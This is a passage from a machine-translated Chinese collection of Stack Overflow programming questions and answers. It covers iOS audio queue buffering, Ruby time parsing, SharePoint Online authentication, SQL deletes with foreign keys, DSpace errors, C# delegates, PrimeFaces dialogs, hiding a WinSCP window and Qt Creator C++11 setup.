audioQueueBufferRef:(AudioQueueBufferRef)inCompleteAQBuffer
{

    unsigned int bufIndex = -1;
    for (unsigned int i = 0; i < kNumberPlaybackBuffers; ++i)
    {
        if (inCompleteAQBuffer == audioQueueBuffers[i])
        {
            bufIndex = i;
            break;
        }
    }

    if (bufIndex == -1)
    {
        NSLog(@"something went wrong at queue callback");
        return;
    }

    // signal waiting thread that the buffer is free.
    pthread_mutex_lock(&queueBuffersMutex);
    NSLog(@"signalling that buffer %d is free",bufIndex);

    inuse[bufIndex] = false;
    buffersUsed--;    

    pthread_cond_signal(&queueBufferReadyCondition);
    pthread_mutex_unlock(&queueBuffersMutex);
}

@end 
```

**更新：** [btomw](https://stackoverflow.com/users/1337057/btomw)下面的[回答](https://stackoverflow.com/a/12287800/766570)很好地解决了这个问题。但我想深入了解这一点（大多数像我这样的新手开发人员，甚至 btomw 在他刚开始时通常在黑暗中拍摄参数，格式等 - 见[这里](https://stackoverflow.com/a/11418708/766570)的例子 -）..

我提供 nul 作为 AVURLAsset 的参数的原因 *songAsset = [AVURLAsset URLAssetWithURL:assetURL options:audioReadSettings];

是因为根据[文档](https://developer.apple.com/library/mac/#documentation/AVFoundation/Reference/AVAssetReaderTrackOutput_Class/Reference/Reference.html)和反复试验，我意识到除了 lPCM 之外的任何格式都会被彻底拒绝。换句话说，当您使用 AVAseetReader 或转换时，即使结果*始终*是lPCM .. 所以我认为默认格式无论如何都是 lPCM 所以我将其保留为空.. 但我想我错了。

这其中奇怪的部分（如果我错了，请纠正我）是我提到的......假设原始文件是.mp3，我的意图是回放它（或通过网络发送数据包等）作为 mp3.. 所以我提供了一个 mp3 ABSD.. 资产阅读器会崩溃！那么，如果我想以原始形式发送它，我只提供 null 吗？一个明显的问题是，一旦我在另一边收到它，我就无法弄清楚它有什么 ABSD.. 或者我可以吗？

**更新 2：您可以从**[github](https://github.com/abbood/audioSamplingToAudioQueue)下载代码。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-05T18:42:42.117

所以这就是我认为正在发生的事情，以及我认为你可以如何解决它。

您正在从 iOS 设备上的 ipod（音乐）库中提取预定义项目。然后，您将使用资产读取器来收集它的缓冲区，并在可能的情况下将这些缓冲区排队到 AudioQueue 中。

我认为，您遇到的问题是您将音频队列缓冲区的输入格式设置为线性脉冲编码调制（LPCM - 希望我没看错，我可能不理解首字母缩写词）。您传递给资产阅读器输出的输出设置为 nil，这意味着您将得到一个很可能不是 LPCM 的输出，而是 aiff 或 aac 或 mp3 或歌曲的任何格式，因为它存在于iOS 的媒体库。但是，您可以通过传入不同的输出设置来纠正这种情况。

尝试改变

```
readerOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:track outputSettings:nil]; 
```

到：

```
[NSDictionary dictionaryWithObjectsAndKeys:
                                                 [NSNumber numberWithInt:kAudioFormatLinearPCM], AVFormatIDKey, 
                                                 [NSNumber numberWithFloat:44100.0], AVSampleRateKey,
                                                 [NSNumber numberWithInt:2], AVNumberOfChannelsKey,
                                                 [NSData dataWithBytes:&channelLayout length:sizeof(AudioChannelLayout)],
                                                 AVChannelLayoutKey,
                                                 [NSNumber numberWithInt:16], AVLinearPCMBitDepthKey,
                                                 [NSNumber numberWithBool:NO], AVLinearPCMIsNonInterleaved,
                                                 [NSNumber numberWithBool:NO],AVLinearPCMIsFloatKey,
                                                 [NSNumber numberWithBool:NO], AVLinearPCMIsBigEndianKey,
                                                 nil];

output = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:track audioSettings:outputSettings]; 
```

我的理解是（根据 Apple [1](https://developer.apple.com/library/mac/#documentation/AVFoundation/Reference/AVAssetReaderTrackOutput_Class/Reference/Reference.html "这里")的文档），作为输出设置参数传递`nil`会为您提供与原始音轨相同文件类型的样本。即使您有一个 LPCM 文件，其他一些设置也可能会关闭，这可能会导致您的问题。至少，这将使所有阅读器输出正常化，这应该使解决问题更容易一些。

希望有帮助！

**编辑：**

> 我提供 nul 作为 AVURLAsset 的参数的原因 *songAsset = [AVURLAsset URLAssetWithURL:assetURL options:audioReadSettings];
> 
> 是因为根据文档和反复试验，我...

AVAssetReaders 做两件事；读回磁盘上存在的音频文件（即：mp3、aac、aiff），或将音频转换为 lpcm。

如果您`nil`作为输出设置传递，它将在文件存在时读回文件，在此您是正确的。我很抱歉没有提到资产阅读器只允许 nil 或 LPCM。实际上我自己也遇到了这个问题（它在某个地方的文档中，但需要一些潜水），但没有选择在这里提及它，因为当时我并没有想到它。呜呜……对不起？

如果您想在阅读之前知道正在阅读的曲目的 AudioStreamBasicDescription (ASBD)，可以通过以下方式获取：

```
AVURLAsset* uasset = [[AVURLAsset URLAssetWithURL:<#assetURL#> options:nil]retain];
AVAssetTrack*track = [uasset.tracks objectAtIndex:0];
CMFormatDescriptionRef formDesc = (CMFormatDescriptionRef)[[track formatDescriptions] objectAtIndex:0];
const AudioStreamBasicDescription* asbdPointer = CMAudioFormatDescriptionGetStreamBasicDescription(formDesc);
//because this is a pointer and not a struct we need to move the data into a struct so we can use it
AudioStreamBasicDescription asbd = {0};
memcpy(&asbd, asbdPointer, sizeof(asbd));
    //asbd now contains a basic description for the track 
```

然后，您可以将其转换`asbd`为您认为合适的任何格式的二进制数据并通过网络传输。然后，您应该能够开始通过网络发送音频缓冲区数据并使用您的 AudioQueue 成功播放它。

不久前我实际上有一个这样的系统工作，但由于当 iOS 客户端设备进入后台时我无法保持连接，所以我无法将它用于我的目的。尽管如此，如果所有这些工作让我帮助其他可以实际使用这些信息的人，对我来说似乎是一个胜利。

# ruby-on-rails - Ruby：将字符串和 DateTimes 传递给 Time.Parse 的优雅方式

> ID：12264810
> 
> 赞同：2
> 
> 时间：2012-09-04T13:43:41.450
> 
> 标签：ruby-on-rails, ruby

我有一个方法，它采用 DateTime （当前作为字符串），然后我将其转换为 DateTime 对象，例如：

```
def foo(time)
  the_time = Time.parse(time)
  ...
end 
```

所以，

```
foo("2012-09-03") 
```

我还希望能够解析 DateTime 对象：

```
foo(Time.now) 
```

但`Time.parse`抱怨我没有给它一个字符串：

```
NoMethodError: undefined method `gsub!' for 2012-08-08 15:59:00 UTC:Time 
```

是否有一种优雅的（一行？）方式从字符串或 DateTime 对象返回 DateTime 对象（我宁愿避免使用 if 语句）

谢谢

编辑：感谢您的评论-我对使用 if 语句没有真正的反感，我只是想看看是否有更好的

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T14:16:06.237

这是一种不带`if`语句的方法：

```
def foo(time)
  the_time = Time.parse(time.to_s)
  # ...
end 
```

但是，如果您正在寻找一个优雅的解决方案，我怀疑是否可以考虑重新解析日期。为什么你认为这`if`是一个糟糕的选择？这是我的做法：

```
def foo(time)
  the_time = time.respond_to?(:to_time) ? time.to_time : Time.parse(time.to_s)
  # ...
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:29:42.867

你试过`to_s`在你的论点上使用吗？

```
...
the_time = Time.parse(time.to_s)
...

foo("2012-08-08 15:59:00")
#=> 2012-08-08 15:59:00 +0200
foo(Time.now)
#=> 2012-09-04 16:27:46 +0200 
```

当然，在`Time`对象来回转换它的情况下，但如果您不想使用`if`，这可能是最简单的方法。

# sharepoint - 如何使用固定凭据在 Office 365 中获取 ClientContext（不提示用户）

> ID：12264811
> 
> 赞同：5
> 
> 时间：2012-09-04T13:43:50.980
> 
> 标签：sharepoint, sharepoint-2010, office365, sharepoint-object-model

我正在制作一个工具原型，该工具每隔几分钟运行一次，然后转到 Office 365 站点，检索并处理信息。

目前，我从 MSDN 指南**“使用基于声明的身份验证在 SharePoint Online 中进行远程身份验证”**开始，它指向一个非常有用的代码示例，该示例基于用户登录获取客户端上下文对象，然后提取 cookie。

我希望能够在任务计划程序中运行我的代码，这样您就可以在某处的配置中指定办公室用户名和密码。

有没有人有任何代码可以做到这一点或一个起点。就像是

```
using (ClientContext ctx = SomeClass.GetContext(targetSiteUrl, username, password))
{
    if (ctx != null)
    {
        //dostuffhere
    }
} 
```

我已经看到这篇博客文章[使用声明身份验证自动登录 SharePoint，](http://craigsdotnet.blogspot.co.uk/2012/05/automatic-login-for-sharepoint-using.html)但网站上的代码似乎不完整/我无法让它工作

请注意，我指的是 Office 365 的当前版本（基于 2010 年），而不是 2013 年新推出的测试版

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:12:06.517

那么，您是否希望允许用户在没有注册 SharePoint 的情况下访问某些内容？如果是这样，您可能需要考虑在代码中提升当前用户的权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T10:53:09.657

可以确认[这里](http://blogs.msdn.com/b/cjohnson/archive/2011/05/14/part-2-headless-authentication-with-sharepoint-online-and-the-client-side-object-model.aspx)的帖子有答案。您可以使用 MSOnlineHelper 类进行无头身份验证

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-08T11:54:55.973

使用[SharePointOnlineCredentials](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.client.sharepointonlinecredentials.aspx)类来实例化 clientContext.Credentials。

> SharePointOnlineCredentials 类表示提供凭据以访问 SharePoint Online 资源的对象。

# sql - 如何删除以名称的第一个字符开头的行？

> ID：12264813
> 
> 赞同：4
> 
> 时间：2012-09-04T13:43:54.313
> 
> 标签：sql, oracle

我有一个表**Movie**，它的 movieID 是主键，它的外键是表 Budget 中的 movieID。Movie 表有一个属性 MovieTitle，它是电影的名称。

我想知道如何删除以电影表中第一个字符“K”开头的行。

比如我想删除电影片名《天国》，但必须先删除Budge表中的外键。我想知道这种情况的命令是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T14:22:02.253

我认为这将是您最好的选择。您应该有一个`ON DELETE`外键约束，一旦从您的表中删除，就会删除相应的记录。

```
DELETE FROM Movie WHERE SUBSTR(movieTitle, 1, 1) = 'K' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:47:11.640

删除标题为“天国”的电影的所有记录，然后您也可以删除该电影。

```
SELECT movieID FROM Movie WHERE movieTitle = 'Kingdom of Heaven' 
```

这将返回您的movieID，然后从第二个表中删除有关此ID 的记录

```
DELETE * FROM (secondTable) WHERE movieID = (value got from the first query) 
```

现在，你终于可以删除电影了

```
DELETE * FROM Movie WHERE movieID = (value got from the first query) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T15:24:58.013

> 比如我想删除电影片名《天国》，但必须先删除Budge表中的外键。我想知道这种情况的命令是什么。

通过在 Budge 中将引用电影的外键声明为`ON DELETE CASCADE`. 当您这样做时，删除电影将自动删除 Budge 中引用电影表的所有行。

要删除所有以“K”开头的电影（我认为这个想法实际上不太可能是您真正想要的），请使用以下内容。

```
delete from movie
where MovieTitle like 'K%'; 
```

指定整个标题*更*安全，但您应该知道电影有时会共享标题。（《速度》、《逃亡者》、《泰坦尼克号》等）

```
delete from movie
where MovieTitle = 'Klute'; 
```

为了清楚您的意思是两部电影中的哪一部电影，当两部电影共享相同的标题时，请单独使用 MovieID，或同时使用标题和 id。*（如果整个语句出现在日志文件中，如果您同时*拥有标题和 ID 号，则更容易查看发生了什么。）

```
delete from movie
where MovieTitle = 'Titanic'
  and MovieID = 42; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T14:42:41.960

我建议您使用类似下面的东西，以免在多用户环境中遇到肮脏的行为。意图 - 在您的删除声明期间不允许更改电影标题。

```
declare 
 lMovieRec Movie%rowtype;
begin
 select *
 into lMovieRec
 from movie
 where SUBSTR(movieTitle, 1, 1) = 'K'
 for update nowait;

 delete from Budge  WHERE movieID = lMovieRec.id;

 delete from movie WHERE ID = lMovieRec.id; 
end; 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-09-04T13:49:25.403

尝试这个：

```
delete from Movie where MovieTitle like 'K%' 
```

# java - DSpace 未列出集合，java.lang.NumberFormatException: null

> ID：12264817
> 
> 赞同：1
> 
> 时间：2012-09-04T13:44:09.570
> 
> 标签：java, dspace

我在 Mandravia Linux 上安装了 DSpace。我没有安装它，实际上我对它知之甚少。

直到最近提交开始花费太长时间并且没有显示集合时，它一直运行良好。最后一个错误显示为：

```
java.lang.NumberFormatException: null
=============================================
javax.servlet.ServletException: java.lang.NumberFormatException: null
    at     org.dspace.app.webui.servlet.HandleServlet.preProcessCommunityHome(HandleServlet.java:486)
at org.dspace.app.webui.servlet.HandleServlet.communityHome(HandleServlet.java:438)
at org.dspace.app.webui.servlet.HandleServlet.doDSGet(HandleServlet.java:250)
at org.dspace.app.webui.servlet.DSpaceServlet.processRequest(DSpaceServlet.java:119)
at org.dspace.app.webui.servlet.DSpaceServlet.doGet(DSpaceServlet.java:67)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.dspace.utils.servlet.DSpaceWebappServletFilter.doFilter(DSpaceWebappServletFilter.java:78)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:852)
at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.NumberFormatException: null
at java.lang.Integer.parseInt(Integer.java:417)
at java.lang.Integer.parseInt(Integer.java:499)
at org.dspace.app.webui.components.RecentSubmissionsManager.getRecentSubmissions(RecentSubmissionsManager.java:76)
at org.dspace.app.webui.components.RecentCommunitySubmissions.process(RecentCommunitySubmissions.java:48)
at org.dspace.app.webui.servlet.HandleServlet.preProcessCommunityHome(HandleServlet.java:480)
... 21 more

null
=============================================
java.lang.NumberFormatException: null
at java.lang.Integer.parseInt(Integer.java:417)
at java.lang.Integer.parseInt(Integer.java:499)
at org.dspace.app.webui.components.RecentSubmissionsManager.getRecentSubmissions(RecentSubmissionsManager.java:76)
at org.dspace.app.webui.components.RecentCommunitySubmissions.process(RecentCommunitySubmissions.java:48)
at org.dspace.app.webui.servlet.HandleServlet.preProcessCommunityHome(HandleServlet.java:480)
at org.dspace.app.webui.servlet.HandleServlet.communityHome(HandleServlet.java:438)
at org.dspace.app.webui.servlet.HandleServlet.doDSGet(HandleServlet.java:250)
at org.dspace.app.webui.servlet.DSpaceServlet.processRequest(DSpaceServlet.java:119)
at org.dspace.app.webui.servlet.DSpaceServlet.doGet(DSpaceServlet.java:67)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.dspace.utils.servlet.DSpaceWebappServletFilter.doFilter(DSpaceWebappServletFilter.java:78)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:852)
at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
at java.lang.Thread.run(Thread.java:662) 
```

我一直认为一个好的解决方案是重新安装 DSpace，但我担心问题是数据损坏、空值或类似的东西。

你怎么认为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:48:46.627

检查源，看来您尚未设置该`recent.submissions.count`属性。

相关源代码在[这里](https://svn.duraspace.org/dspace/dspace/branches/dspace-1_5_x/dspace-jspui/dspace-jspui-api/src/main/java/org/dspace/app/webui/components/RecentSubmissionsManager.java)。

# c# - 有什么比向 Funcs 添加虚拟参数以使签名匹配更好的解决方案？

> ID：12264818
> 
> 赞同：1
> 
> 时间：2012-09-04T13:44:10.630
> 
> 标签：c#

我有一个参数类型为的方法

```
Func<Color, Double, Color> colorFunc 
```

这很有用，因为我可以指定许多函数中的任何一个并临时发明新的函数。我的困难是，虽然几乎所有函数都需要一个额外的参数（在本例中为 Double），但有些则没有。我通过添加一个从未用于这些函数的“虚拟”可选参数解决了这个问题。

这是最好的解决方案吗？如果我有多个具有不同数量参数的函数怎么办？我应该用虚拟参数把它们都加起来吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:53:41.847

我建议从`Func<t>`委托转移到自定义委托类型，在这种情况下，有几个原因。

一、默认值

```
 public delegate Color HerpinateColor(Color initial, double count = double.NaN); 
```

您可以识别可选参数并设置它们的默认值。但是，如果默认值是传入的值，该怎么办？这给我带来了第二个好处，*文档！*

```
 /// <summary>
    /// A method to reherpinate colors or something lol
    /// </summary>
    /// <param name="initial">An initial value for the <see cref="Color"/>
    /// to apply the reherpenation algorithm on.</param>
    /// <param name="count">(optional)The average herp of the derp.</param>
    /// <returns>A reherpenated <see cref="Color"/></returns>
    /// <remarks>Implementations should avoid fooing the bar if <paramref name="count"/>
    /// is <see cref="double.NaN"/>.</remarks>
    public delegate Color HerpinateColor(Color initial, double count = double.NaN); 
```

可以记录自定义代表。哦，当然，你可以把它塞进你的方法签名中，但它不会出现在智能感知中（或者会受到严重限制）。

Funcs/actions 非常有用，但是使用自定义委托仍然比它们有一些优势。

* * *

哦，你仍然可以使用 lambda，这意味着你的 API 仍然对实现者有同样的感觉。

```
HerpinateColor derp = (initial, count) => double.IsNaN(count) ? 
                                                 Color.Multiply(initial, .5f) : 
                                                 Color.Multiply(initial, (float)count); 
```

# primefaces - 您如何等待 primefaces 中的输入对话框

> ID：12264821
> 
> 赞同：0
> 
> 时间：2012-09-04T13:44:16.810
> 
> 标签：primefaces

我有兴趣显示一个输入对话框，一旦用户在对话框中输入节点的名称，我想用他们输入的名称创建一个树节点。

我正在创建编辑对话框，然后在同一个函数中添加所有节点，但我看到的行为是树节点出现在对话框出现之前或用户甚至有机会提交节点的名称之前，这意味着显示对话框后包含的其余代码不会等待对话框返回输入。

有没有办法提供一个输入对话框并等待完成，然后再采取另一项行动？

这是我的代码 - add() 方法调用 editKey() 方法，然后添加节点。

我希望能够等待每个键的输入并在 add 函数中的其余代码继续之前构建标签名称，但情况似乎并非如此：

```
public void add(){
    log.debug("node=<" + node.getValue() + ">");
    Node saveNode = node;
    if (node.getInfo().isList() || 
        node.getInfo().isLeafList()){
        try{
            TreeHelper treeHelper = (TreeHelper)device.getTreeHelper();
            Node n = treeHelper.getSchemaNode(node, node.getTagPath());
            if (n != null){
                if (node.getInfo().isList()){
                    log.debug("node<" + node.getName() + " is a list!");
                    String tagName = "";
                    if (n.getKeys().size() > 0){
                        for(String key: n.getKeys()){
                          node = n.getChildren().get(key); 
                          if (node != null){
                              editKey(node);
                          }
                          if (tagName.equals("")){
                            tagName += node.getValue();
                          }else{
                              tagName += "-" + node.getValue();
                          }
                        }
                    }
                    n.setTag(tagName);
                    n.getInfo().setListEntry(true);
                    n.getNodeTypes().remove("List");
                    n.getNodeTypes().add("ListEntry");
                    node = saveNode;
                }else if (node.getInfo().isLeafList()){
                    log.debug("node <" + node.getName() + "> is a leaf list!");
                    n.getInfo().setLeafListEntry(true);
                    n.getNodeTypes().remove("LeafList");
                    n.getNodeTypes().add("LeafListEntry");
                }
                addTreeNode(this.device,
                        selectedNode,
                        n,
                        true,
                        true);
            }else{
                log.debug("schema node is null for node <" + node.getName() + ">");
            }

       }catch(Exception e){
            log.error(IO.stackTrace(e));
       }
       selectedNode.setExpanded(true); 
    }
    RequestContext.getCurrentInstance().update("treeForm:treeSingle");
} 
```

这是 editKey() 函数：

```
public void editKey(Node node) throws Exception{
    FacesContext ctx = FacesContext.getCurrentInstance();

    UIViewRoot rootView = ctx.getViewRoot();
    Dialog dialog = (Dialog)rootView.findComponent("editDialog");

    dialog.setVisible(true);
    dialog.setModal(true);

    dialog.getChildren().clear();

    UIForm form = new UIForm();
    form.getChildren().clear();

    PanelGrid panel = new PanelGrid();
    panel.setColumns(2);

    OutputLabel label = new OutputLabel();
    label.setValue(node.getName());
    label.setFor("valueId");
    panel.getChildren().add(label);

    if (node.getDataTypes().contains("BOOL") ||
        (node.getValue() != null && 
        (node.getValue().equals("false") || node.getValue().equals("true")))){
        SelectOneMenu menu = new SelectOneMenu();
        ValueExpression valueExpression = createValueExpression("#{treeBean.node.value}");
        menu.setValueExpression("value", valueExpression);
        menu.setId("valueId");
        menu.setLabel(node.getName());
        if (node.getValue() != null &&
            node.getValue().equals("false")){
            UISelectItem item = new UISelectItem();
            item.setItemLabel("false");
            item.setItemValue("false");
            menu.getChildren().add(item);
            item = new UISelectItem();
            item.setItemLabel("true");
            item.setItemValue("true");
            menu.getChildren().add(item);
        }else{
            UISelectItem item = new UISelectItem();
            item.setItemLabel("true");
            item.setItemValue("true");
            menu.getChildren().add(item);                
            item = new UISelectItem();
            item.setItemLabel("false");
            item.setItemValue("false");
            menu.getChildren().add(item);
        }
        panel.getChildren().add(menu);
    }else if (node.getEnums().size() > 0){
        SelectOneMenu menu = new SelectOneMenu();
        ValueExpression valueExpression = createValueExpression("#{treeBean.node.value}");
        menu.setValueExpression("value", valueExpression);
        menu.setId("valueId");
        menu.setLabel(node.getName());
        for(String s : node.getEnums()){
            int index = s.indexOf(":");
            if (index != -1){
                s = s.substring(0, index);
            }
            UISelectItem item = new UISelectItem();
            item.setItemLabel(s);
            item.setItemValue(s);
            menu.getChildren().add(item);
        }
        panel.getChildren().add(menu);
    }else{
        InputText inputText = new InputText();
        ValueExpression valueExpression = createValueExpression("#{treeBean.node.value}");
        inputText.setValueExpression("value", valueExpression);
        inputText.setId("valueId");
        inputText.setLabel(node.getName());
        inputText.setType("text");
        panel.getChildren().add(inputText);
    }
    UIOutput output = new UIOutput();
    output.setValue("Data types:  ");
    panel.getChildren().add(output);
    output = new UIOutput();
    output.setValue(node.getDataTypes().toString().replace("]", "").replace("[", ""));
    panel.getChildren().add(output);

    output = new UIOutput();
    output.setValue("Min. occurs:  ");
    panel.getChildren().add(output);
    output = new UIOutput();
    output.setValue(node.getMinOccurs()+"");
    panel.getChildren().add(output);

    output = new UIOutput();
    output.setValue("Max. occurs:  ");
    panel.getChildren().add(output);
    output = new UIOutput();
    output.setValue(node.getMaxOccurs()+"");
    panel.getChildren().add(output);

    form.getChildren().add(panel);

    CommandButton button = new CommandButton();
    button.setOnclick("$('#progress').show();$('#editDialog').hide();");
    button.setOncomplete("$('#progress').hide();$('#editDialog').hide();");
    button.setValue("submit");
    MethodExpression me = createMethodExpression("#{treeBean.save}");
    button.setActionExpression(me);

    form.getChildren().add(button);

    dialog.getChildren().add(form);

    RequestContext.getCurrentInstance().update("editDialog");
    RequestContext.getCurrentInstance().execute("editWidget.show()");

} 
```

# c# - 隐藏 System.Diagnostics.Process GUI 窗口

> ID：12264822
> 
> 赞同：1
> 
> 时间：2012-09-04T13:44:21.193
> 
> 标签：c#, winscp

我真的在努力解决以下问题。我知道我的场景有类似的问题，但没有一个是完全相同的场景。

我创建了一个 SSIS 自定义组件，它启动了一个我想在静默模式下运行的外部应用程序。无论我尝试什么，gui总是会出现。如果我在控制台应用程序中使用相同的代码，我根本不会遇到任何问题。我可以看到我的 SSIS 自定义组件 (dll) 和控制台应用程序之间的唯一区别是我的组件引用 System.Windows.Forms 并使用 BIDS。我正在使用以下代码。任何提示我都非常愿意尝试。

```
Process winscp = new Process();

winscp.StartInfo.FileName = @stExe;
winscp.StartInfo.Arguments = "/log=";
winscp.StartInfo.UseShellExecute = false;
winscp.StartInfo.RedirectStandardInput = true;
winscp.StartInfo.RedirectStandardOutput = true;
winscp.StartInfo.CreateNoWindow = true; 

winscp.Start(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:12:29.980

可以使用[ShowWindow](http://www.pinvoke.net/default.aspx/user32.showwindow)。您需要确保在创建进程窗口之后调用 ShowWindow 方法，而不是在它启动期间调用。

```
[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
```

出现处理窗口后调用以下命令。

```
ShowWindow(winscp.MainWindowHandle, 0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:13:42.870

尝试找到新进程的窗口，尽快隐藏。

使用 Win32 API，

```
HWND hwnd = FindWindow(NULL, "Title");
ShowWindow(hwnd, SW_HIDE); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-03T14:02:08.247

在运行 WinSCP 时：

*   如果使用`winscp.com`，则`CreateNoWindow`应该工作，因为控制台窗口是由系统创建的，因此可以由`CreateNoWindow`
*   如果使用`winscp.exe`，则`CreateNoWindow`不起作用，因为控制台窗口是由 WinSCP 本身创建的。但是您可以通过省略`/console`参数来强制 WinSCP 不创建窗口

详情参考：
[https ://winscp.net/eng/docs/executables](https://winscp.net/eng/docs/executables)

# jquery - jquery Validation 难以以单一形式处理多个部分的行为

> ID：12264823
> 
> 赞同：0
> 
> 时间：2012-09-04T13:44:24.383
> 
> 标签：jquery, jquery-plugins, jquery-validate

我有一个包含多个部分的表单，我无法独立处理单个表单中的部分验证行为。

在这个例子中，[http://jsbin.com/ojihiv/4/edit](http://jsbin.com/ojihiv/4/edit)，我有2个section，在section 1，我需要实现在一个section显示错误信息，在section 2，我需要实现错误信息的显示作为输入元素的标题。

这个例子的问题是，总是第一个选择的行为将在之后应用。这可以进行如下测试。

案例 1：单击 validateemail 而不输入数据，显示部分级别的错误消息，现在单击 validatename 现在错误消息应该显示为标题，而它显示为部分。

刷新页面

案例 2：单击 validatename 而不输入数据，错误消息显示为标题，现在单击 validateemail 错误消息应该显示为 section ，其中错误显示为标题。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:02:32.903

将文本框放在 div 标签中。

我已经给出了一个验证示例，错误消息将显示在“最近”的 div 中。

```
$("#prRegistration").validate({
   rules: {
        user_name: { 
            required: true, minlength: 2
        }
    },

    messages: {
        user_name: {
            required :"Please enter first name"
            // minlength:""
        }
    },
    errorPlacement: function(error, element) {error.insertAfter(element.closest("div"));}
}); 
```

# c++ - 如何配置 QtCreator 以使用 C++11？

> ID：12264824
> 
> 赞同：5
> 
> 时间：2012-09-04T13:44:25.810
> 
> 标签：c++, qt, c++11, qt-creator

我使用 QtCreator 2.5.1 和 Qt 4.8.0 编写了一些项目。我添加到 *.pro 文件：

```
QMAKE_CXXFLAGS += -std=c++0x 
```

并且所有编译和工作都是正确的，但 IDE 仍然将 C++11 样式的代码高亮显示为错误。例如这个字符串：

```
QVector<int> colwi{100,70,30,40,25,25,25,25,25}; 
```

这可以解决吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-08T19:49:33.293

在您的 qmake .pro 文件中，添加

Qt5：

```
CONFIG += c++11 
```

或 Qt4：

```
CXXFLAGS += -std=c++11 
```

见[http://qt-project.org/forums/viewthread/24551](http://qt-project.org/forums/viewthread/24551)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-16T18:38:36.997

部分通过升级到 Qt Creator 2.6。它对 C++11 特性有更好的支持，但仍然不完整。环顾四周，创造者在那里相处得很好：我还没有看到任何涵盖所有新功能的编译器；-)

请注意，Creator 确实会查看您的项目设置的 CXXFLAGS。如果您将 -std=c++0x 排除在外，则代码模型将不会使 C++11 功能可用。

# css - 删除滚动条 iframe

> ID：12264830
> 
> 赞同：0
> 
> 时间：2012-09-04T13:44:45.183
> 
> 标签：css, iframe

我知道这听起来像一个非常愚蠢的问题，但无论如何要在 iframe 上隐藏滚动条但保留鼠标滚动的功能？

我试过overflow-y:hidden, scrolling="no" 有人有什么想法吗？

干杯，布伦特

# android - 在android中延迟super.onbackpressed

> ID：12264831
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:44:51.263
> 
> 标签：android, quit

我制作了一个脚本来检测是否有互联网连接：

```
 public static boolean isOnline() {
    try {
        InetAddress.getByName("google.hu").isReachable(3);
        return true;
    } catch (UnknownHostException e){
        return false;
    } catch (IOException e){
        return false;
    }
} 
```

如果没有互联网，该应用程序将警告用户并退出！但是如何将 super.onBackPressed 延迟 20 秒？:)

```
 this.toast1 = new Toast(getApplicationContext());
    toast1.setGravity(Gravity.CENTER, 0, 0);
    toast1.setDuration(20000);
    toast1.setView(layout);
    toast1.show();
    super.onBackPressed(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:52:42.937

```
